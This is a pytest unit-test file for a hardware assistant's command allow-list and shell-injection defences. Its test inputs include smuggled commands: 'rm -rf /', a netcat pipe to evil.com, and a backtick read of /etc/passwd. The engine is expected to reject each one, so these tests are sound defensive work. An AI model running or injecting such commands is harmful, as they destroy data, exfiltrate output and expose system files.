"""
Unit Tests for Execution Safety, Allow-listing, and Injection Prevention.
"""
import pytest
from hardware_assistant.execution_engine import execution_engine, SecurityExecutionError
from hardware_assistant.config import SAFE_COMMAND_ALLOWLIST

def test_allowlisted_tools_present():
    assert "get_cpu_info" in SAFE_COMMAND_ALLOWLIST
    assert "get_block_devices" in SAFE_COMMAND_ALLOWLIST
    assert "get_memory_summary" in SAFE_COMMAND_ALLOWLIST
    assert "get_dmi_memory" in SAFE_COMMAND_ALLOWLIST
    assert "get_pci_devices" in SAFE_COMMAND_ALLOWLIST

def test_unauthorized_tool_rejected():
    with pytest.raises(SecurityExecutionError) as exc_info:
        execution_engine.execute_tool("arbitrary_bash_command")
    assert "not in the system allow-list" in str(exc_info.value)

def test_shell_injection_semicolon_rejected():
    with pytest.raises(SecurityExecutionError) as exc_info:
        execution_engine.execute_tool("get_cpu_info", {"extra_arg": "test; rm -rf /"})
    assert "Shell metacharacter" in str(exc_info.value)

def test_shell_injection_pipe_rejected():
    with pytest.raises(SecurityExecutionError) as exc_info:
        execution_engine.execute_tool("get_block_devices", {"filter": "dev | nc evil.com 1337"})
    assert "Shell metacharacter" in str(exc_info.value)

def test_shell_injection_backtick_rejected():
    with pytest.raises(SecurityExecutionError) as exc_info:
        execution_engine.execute_tool("get_dmi_memory", {"slot": "`cat /etc/passwd`"})
    assert "Shell metacharacter" in str(exc_info.value)
